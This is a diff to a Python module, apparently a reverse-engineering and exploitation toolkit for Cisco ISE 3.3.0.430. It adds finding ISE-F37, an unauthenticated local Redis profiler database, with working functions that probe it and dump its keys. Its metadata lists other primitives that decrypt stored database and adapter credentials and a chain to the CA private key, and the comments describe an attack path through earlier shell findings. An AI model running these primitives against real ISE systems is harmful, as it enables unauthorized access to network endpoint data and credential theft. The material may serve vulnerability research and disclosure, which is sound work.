@@ -52,6 +52,7 @@ ISE-F25: Kairos AI agent hardcoded production cloud endpoint + version disclosur
 ISE-F34: LUKS sec_confleak partition key exposed via key_manager decrypt oracle — chain to CA privkey [CRITICAL]
 ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside KEK-encrypted credentials [HIGH]
 ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB UUIDs — decrypt TCNAC credentials [HIGH]
+ISE-F37: Redis profiler database on localhost:6379 — no requirepass, no TLS; stores ISE endpoint/profiler data [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3010,9 +3011,94 @@ def extract_cta_credentials_from_mongodb(host: str = "localhost", port: int = 27
         return None
 
 
+# ---------------------------------------------------------------------------
+# ISE-F37: Redis profiler database — no auth, stores ISE endpoint/profiler data
+# ---------------------------------------------------------------------------
+#
+# Source: /opt/CSCOcpm/redis-4.0.11/redis.conf
+#         /opt/CSCOcpm/bin/rediscontrol.sh
+#
+# Redis 4.0.11 runs on 127.0.0.1:6379, bound to loopback only.
+# No requirepass configured — any local process can connect without auth.
+# Database file: profiler_local.rdb (ISE endpoint profiler state).
+#
+# Data stored: device type, OS fingerprint, NAC posture state, endpoint MAC/IP
+# mappings, profiled attributes used for policy decisions.
+#
+# Attack path: any local code execution on the ISE host (e.g., OS shell via
+# Tomcat WAR upload ISE-F3, or EDDA container shell ISE-F11) → redis-cli -h
+# 127.0.0.1 -p 6379 → KEYS * → full profiler dump without auth.
+#
+# Remediation: set requirepass in redis.conf; restrict unix socket permissions.
+
+REDIS_HOST    = "127.0.0.1"
+REDIS_PORT    = 6379
+REDIS_DBFILE  = "/opt/CSCOcpm/redis/profiler_local.rdb"
+
+
+def probe_redis_profiler(host: str = REDIS_HOST, port: int = REDIS_PORT) -> Optional[dict]:
+    """
+    ISE-F37: Probe ISE Redis profiler database without auth.
+
+    Returns {"dbsize": N, "info_server": {...}} or None if unreachable.
+    """
+    try:
+        import socket
+        import json
+
+        def redis_cmd(sock: socket.socket, *args) -> str:
+            cmd = f"*{len(args)}\r\n" + "".join(f"${len(str(a))}\r\n{a}\r\n" for a in args)
+            sock.sendall(cmd.encode())
+            return sock.recv(4096).decode(errors="replace")
+
+        with socket.create_connection((host, port), timeout=5) as s:
+            dbsize_resp = redis_cmd(s, "DBSIZE")
+            info_resp   = redis_cmd(s, "INFO", "server")
+        dbsize = int(dbsize_resp.strip().lstrip(":")) if dbsize_resp.startswith(":") else -1
+        return {"dbsize": dbsize, "info_server": info_resp}
+    except Exception:
+        return None
+
+
+def dump_redis_profiler_keys(host: str = REDIS_HOST, port: int = REDIS_PORT,
+                              pattern: str = "*", count: int = 100) -> Optional[list]:
+    """
+    ISE-F37: Dump keys from ISE Redis profiler database without auth.
+
+    Returns list of key strings, or None if unreachable.
+    """
+    try:
+        import socket
+
+        def redis_cmd_raw(sock: socket.socket, *args) -> bytes:
+            cmd = f"*{len(args)}\r\n" + "".join(f"${len(str(a))}\r\n{a}\r\n" for a in args)
+            sock.sendall(cmd.encode())
+            data = b""
+            while True:
+                chunk = sock.recv(8192)
+                if not chunk:
+                    break
+                data += chunk
+                if b"\r\n" in data:
+                    break
+            return data
+
+        keys = []
+        with socket.create_connection((host, port), timeout=5) as s:
+            # SCAN 0 MATCH * COUNT 100
+            resp = redis_cmd_raw(s, "SCAN", "0", "MATCH", pattern, "COUNT", str(count))
+            for line in resp.decode(errors="replace").splitlines():
+                line = line.strip()
+                if line and not line.startswith(("*", "$", ":")):
+                    keys.append(line)
+        return keys
+    except Exception:
+        return None
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.15.0",
+    "version": "1.16.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3021,14 +3107,14 @@ MODULE_META = {
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
-        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36",
+        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
-               "ISE-F30", "ISE-F33"],
+               "ISE-F30", "ISE-F33", "ISE-F37"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
@@ -3077,6 +3163,11 @@ MODULE_META = {
         "ise_f36_cta_pbkdf2_hash": "HMAC-SHA512",
         "ise_f36_mongo_collection": "adapterInstances",
         "ise_f36_chain": "ISE-F26->adapterUuid+instanceUuid->PBKDF2->AES-CBC(IV=ISE_AES_TCNAC_VA)->plaintext",
+        "ise_f37_redis_host": "127.0.0.1",
+        "ise_f37_redis_port": 6379,
+        "ise_f37_redis_auth": None,
+        "ise_f37_redis_dbfile": "profiler_local.rdb",
+        "ise_f37_redis_data": "ISE endpoint profiler data (device type, OS, NAC state)",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3132,5 +3223,7 @@ MODULE_META = {
         "derive_cta_aes_key",
         "decrypt_cta_credential",
         "extract_cta_credentials_from_mongodb",
+        "probe_redis_profiler",
+        "dump_redis_profiler_keys",
     ],
 }
